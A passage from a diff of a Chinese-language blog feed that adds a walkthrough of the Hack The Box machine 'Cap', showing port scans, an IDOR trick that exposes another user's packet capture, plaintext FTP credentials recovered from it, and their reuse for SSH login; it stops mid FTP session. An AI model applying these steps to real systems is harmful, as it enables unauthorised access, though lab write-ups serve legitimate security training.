@@ -7,7 +7,355 @@
         <generator>Hugo -- gohugo.io</generator>
         <language>zh-cn</language>
         <copyright>Sp1ke</copyright>
-        <lastBuildDate>Sat, 07 Nov 2026 15:15:29 +0800</lastBuildDate><atom:link href="https://Sp1ke-sec.github.io/post/index.xml" rel="self" type="application/rss+xml" /><item>
+        <lastBuildDate>Sun, 08 Nov 2026 11:30:22 +0800</lastBuildDate><atom:link href="https://Sp1ke-sec.github.io/post/index.xml" rel="self" type="application/rss+xml" /><item>
+        <title>14. Cap</title>
+        <link>https://Sp1ke-sec.github.io/p/14.-cap/</link>
+        <pubDate>Sun, 08 Nov 2026 11:30:22 +0800</pubDate>
+        
+        <guid>https://Sp1ke-sec.github.io/p/14.-cap/</guid>
+        <description>&lt;img src="https://Sp1ke-sec.github.io/p/14.-cap/assets/image-20261108105321725.png" alt="Featured image of post 14. Cap" /&gt;&lt;h1 id=&#34;cap&#34;&gt;Cap
+&lt;/h1&gt;&lt;p&gt;&lt;img src=&#34;https://Sp1ke-sec.github.io/p/14.-cap/assets/image-20261108105321725.png&#34;
+	width=&#34;403&#34;
+	height=&#34;192&#34;
+	srcset=&#34;https://Sp1ke-sec.github.io/p/14.-cap/assets/image-20261108105321725_hu14285743941944886084.png 480w, https://Sp1ke-sec.github.io/p/14.-cap/assets/image-20261108105321725_hu6914197008680624505.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;image-20261108105321725&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;209&#34;
+		data-flex-basis=&#34;503px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;About: Cap is an easy difficulty Linux machine running an HTTP server that performs administrative functions including performing network captures. Improper controls result in Insecure Direct Object Reference (IDOR) giving access to another user&amp;rsquo;s capture. The capture contains plaintext credentials and can be used to gain foothold. A Linux capability is then leveraged to escalate to root.&lt;/p&gt;
+&lt;p&gt;Cap 是一台难度较低的 Linux 机器，运行 HTTP 服务器，执行包括网络捕获在内的管理功能。控制不当会导致不安全的直接对象引用 (IDOR)，从而允许访问其他用户的捕获内容。捕获到的数据包含明文凭据，可用于获取系统访问权限。攻击者随后利用 Linux 系统的特定功能提升至 root 权限。&lt;/p&gt;
+&lt;p&gt;靶机 IP：10.129.14.221&lt;/p&gt;
+&lt;h3 id=&#34;task-1&#34;&gt;Task 1
+&lt;/h3&gt;&lt;blockquote&gt;
+&lt;p&gt;How many TCP ports are open?&lt;/p&gt;
+&lt;p&gt;有多少个TCP端口处于开放状态？&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;33
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;┌──&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;root㉿kali&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;~/HTB/cap&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;└─# nmap -Pn 10.129.14.221                
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Starting Nmap 7.99 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; at 2026-11-07 22:04 -0500
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Nmap scan report &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; 10.129.14.221 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;10.129.14.221&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Host is up &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.25s latency&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Not shown: &lt;span class=&#34;m&#34;&gt;997&lt;/span&gt; closed tcp ports &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;reset&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;PORT   STATE SERVICE
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;21/tcp open  ftp
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;22/tcp open  ssh
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;80/tcp open  http
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Nmap &lt;span class=&#34;k&#34;&gt;done&lt;/span&gt;: &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; IP address &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; host up&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; scanned in 2.88 seconds
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;┌──&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;root㉿kali&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;~/HTB/cap&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;└─# nmap -Pn -p 21,22,80 -sV -sC 10.129.14.221
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Starting Nmap 7.99 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; at 2026-11-07 22:06 -0500
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Nmap scan report &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; 10.129.14.221 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;10.129.14.221&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Host is up &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.25s latency&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;PORT   STATE SERVICE VERSION
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;21/tcp open  ftp     vsftpd 3.0.3
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Ubuntu Linux&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; protocol 2.0&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; ssh-hostkey: 
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   &lt;span class=&#34;m&#34;&gt;3072&lt;/span&gt; fa:80:a9:b2:ca:3b:88:69:a4:28:9e:39:0d:27:d5:75 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;RSA&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   &lt;span class=&#34;m&#34;&gt;256&lt;/span&gt; 96:d8:f8:e3:e8:f7:71:36:c5:49:d5:9d:b6:a4:c9:0c &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;ECDSA&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_  &lt;span class=&#34;m&#34;&gt;256&lt;/span&gt; 3f:d0:ff:91:eb:3b:f6:e1:9f:2e:8d:de:b3:de:b2:18 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;ED25519&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;80/tcp open  http    Gunicorn
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-title: Security Dashboard
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-server-header: gunicorn
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Service Info: OSs: Unix, Linux&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; CPE: cpe:/o:linux:linux_kernel
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Nmap &lt;span class=&#34;k&#34;&gt;done&lt;/span&gt;: &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; IP address &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; host up&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; scanned in 18.71 seconds
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;按理说应该全端口扫描的，但是延迟比较高，所以就默认扫描一千个高频端口了。&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;答案：3&lt;/strong&gt;&lt;/p&gt;
+&lt;h3 id=&#34;task-2&#34;&gt;Task 2
+&lt;/h3&gt;&lt;blockquote&gt;
+&lt;p&gt;After running a &amp;ldquo;Security Snapshot&amp;rdquo;, the browser is redirected to a path of the format &lt;code&gt;/[something]/[id]&lt;/code&gt;, where &lt;code&gt;[id]&lt;/code&gt; represents the id number of the scan. What is the &lt;code&gt;[something]&lt;/code&gt;?&lt;/p&gt;
+&lt;p&gt;运行“安全快照”后，浏览器会被重定向到格式为 /[something]/[id] 的路径，其中 [id] 代表扫描的 ID 号。[something] 是什么？&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;&lt;img src=&#34;https://Sp1ke-sec.github.io/p/14.-cap/assets/image-20261108110900655.png&#34;
+	width=&#34;1190&#34;
+	height=&#34;957&#34;
+	srcset=&#34;https://Sp1ke-sec.github.io/p/14.-cap/assets/image-20261108110900655_hu9499506620527209897.png 480w, https://Sp1ke-sec.github.io/p/14.-cap/assets/image-20261108110900655_hu5511478211640372988.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;image-20261108110900655&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;124&#34;
+		data-flex-basis=&#34;298px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;点击运行安全快照，被重定向到 &lt;code&gt;http://10.129.14.221/data/1&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;答案：data&lt;/strong&gt;&lt;/p&gt;
+&lt;h3 id=&#34;task-3&#34;&gt;Task 3
+&lt;/h3&gt;&lt;blockquote&gt;
+&lt;p&gt;Are you able to get to other users&amp;rsquo; scans?&lt;/p&gt;
+&lt;p&gt;您能查看其他用户的扫描结果吗？&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;&lt;img src=&#34;https://Sp1ke-sec.github.io/p/14.-cap/assets/image-20261108111334621.png&#34;
+	width=&#34;2002&#34;
+	height=&#34;913&#34;
+	srcset=&#34;https://Sp1ke-sec.github.io/p/14.-cap/assets/image-20261108111334621_hu13704514175466974932.png 480w, https://Sp1ke-sec.github.io/p/14.-cap/assets/image-20261108111334621_hu6990610736150315224.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;image-20261108111334621&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;219&#34;
+		data-flex-basis=&#34;526px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;把 1 修改为 0 就能看到之前的扫描结果了。&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;答案：yes&lt;/strong&gt;&lt;/p&gt;
+&lt;h3 id=&#34;task-4&#34;&gt;Task 4
+&lt;/h3&gt;&lt;blockquote&gt;
+&lt;p&gt;What is the ID of the PCAP file that contains sensative data?&lt;/p&gt;
+&lt;p&gt;包含敏感数据的PCAP文件的ID是什么？&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;&lt;strong&gt;答案：0&lt;/strong&gt;&lt;/p&gt;
+&lt;h3 id=&#34;task-5&#34;&gt;Task 5
+&lt;/h3&gt;&lt;blockquote&gt;
+&lt;p&gt;Which application layer protocol in the pcap file can the sensetive data be found in?&lt;/p&gt;
+&lt;p&gt;pcap 文件中的哪个应用层协议包含敏感数据？&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;点击 Download 下载到一个 &lt;code&gt;0.pcap&lt;/code&gt; 文件，然后用 Wireshark 打开分析。&lt;/p&gt;
+&lt;p&gt;整个 pcap 设计到的协议只有 TCP、FTP、HTTP，除了 TCP 是传输层，其它两个都是应用层。&lt;/p&gt;
+&lt;p&gt;先看 HTTP 吧：&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://Sp1ke-sec.github.io/p/14.-cap/assets/image-20261108111830850.png&#34;
+	width=&#34;1547&#34;
+	height=&#34;401&#34;
+	srcset=&#34;https://Sp1ke-sec.github.io/p/14.-cap/assets/image-20261108111830850_hu6893483528663539158.png 480w, https://Sp1ke-sec.github.io/p/14.-cap/assets/image-20261108111830850_hu7935665712432249331.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;image-20261108111830850&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;385&#34;
+		data-flex-basis=&#34;925px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;没什么东西，看一下 FTP：&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://Sp1ke-sec.github.io/p/14.-cap/assets/image-20261108111935992.png&#34;
+	width=&#34;1781&#34;
+	height=&#34;418&#34;
+	srcset=&#34;https://Sp1ke-sec.github.io/p/14.-cap/assets/image-20261108111935992_hu5683193257664040.png 480w, https://Sp1ke-sec.github.io/p/14.-cap/assets/image-20261108111935992_hu18374365474192080997.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;image-20261108111935992&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;426&#34;
+		data-flex-basis=&#34;1022px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;得到明文的账密 nathan:Buck3tH4TF0RM3!&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;答案：ftp&lt;/strong&gt;&lt;/p&gt;
+&lt;h3 id=&#34;task-6&#34;&gt;Task 6
+&lt;/h3&gt;&lt;blockquote&gt;
+&lt;p&gt;We&amp;rsquo;ve managed to collect nathan&amp;rsquo;s FTP password. On what other service does this password work?&lt;/p&gt;
+&lt;p&gt;我们已经获取了Nathan的FTP密码。这个密码还能用于哪些其他服务？&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;试一下 SSH 服务：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;┌──&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;root㉿kali&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;~/HTB/cap&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;└─# ssh nathan@10.129.14.221
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;......
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Last login: Thu May &lt;span class=&#34;m&#34;&gt;27&lt;/span&gt; 11:21:27 &lt;span class=&#34;m&#34;&gt;2021&lt;/span&gt; from 10.10.14.7
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;nathan@cap:~$ 
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;成功登录。&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;答案：SSH&lt;/strong&gt;&lt;/p&gt;
+&lt;h3 id=&#34;submit-user-flag&#34;&gt;Submit User Flag
+&lt;/h3&gt;&lt;blockquote&gt;
+&lt;p&gt;Submit the flag located in the nathan user&amp;rsquo;s home directory.&lt;/p&gt;
+&lt;p&gt;提交位于 nathan 用户主目录中的 flag。&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;33
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;34
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;35
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;36
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;┌──&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;root㉿kali&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;~/HTB/cap&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;└─# ftp 10.129.14.221               
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Connected to 10.129.14.221.
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;m&#34;&gt;220&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;vsFTPd 3.0.3&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Name &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;10.129.14.221:root&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;: nathan
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;m&#34;&gt;331&lt;/span&gt; Please specify the password.
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Password: 
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;m&#34;&gt;230&lt;/span&gt; Login successful.
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Remote system &lt;span class=&#34;nb&#34;&gt;type&lt;/span&gt; is UNIX.
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Using binary mode to transfer files.
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;ftp&amp;gt; ls -la
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;m&#34;&gt;229&lt;/span&gt; Entering Extended Passive Mode &lt;span class=&#34;o&#34;&gt;(||&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;16464&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;m&#34;&gt;150&lt;/span&gt; Here comes the directory listing.
